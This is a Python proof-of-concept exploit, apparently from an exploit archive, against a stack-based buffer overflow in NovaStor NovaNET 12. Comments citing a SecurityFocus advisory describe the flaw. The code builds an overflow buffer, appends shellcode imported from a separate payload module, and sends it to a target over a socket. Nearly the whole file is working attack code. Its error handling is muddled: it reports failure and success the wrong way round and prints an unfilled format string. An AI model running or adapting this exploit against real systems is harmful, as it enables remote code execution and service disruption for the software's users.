#source: https://www.securityfocus.com/bid/33954/info
#
#NovaStor NovaNET is prone to a stack-based buffer-overflow vulnerability because it fails to adequately bounds-check user-supplied data before copying it to an insufficiently sized buffer.
#
#Attackers can exploit this issue to execute arbitrary code within the context of the affected application or cause a denial-of-service condition.
#
#NovaNET 12 is vulnerable; other versions may also be affected.

from payload import buf
import socket
import struct
import sys
def shell_attack(target_machine, target_port): 
#NovaNet 12 PoC by AbdulAziz Hariri.


  
   hostname = target_machine
   buff3r = (b"\x41"*77) + b"\x44"*156 + (b"\x43"*75) + b"\x0d\xf0\x0d\xf0"

   logno = buff3r + buf

   s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
   try:
     s.connect((hostname,target_port))
   except:
      pass
  

 
   try:
    s.send(buf)
   except:
    pass
  

   try:
    s.send(logno)
   except:
      pass
   if s:
    s.close()
    print("[x] Error: %s.\n")
    
   else:
    print("[x] Sent!")

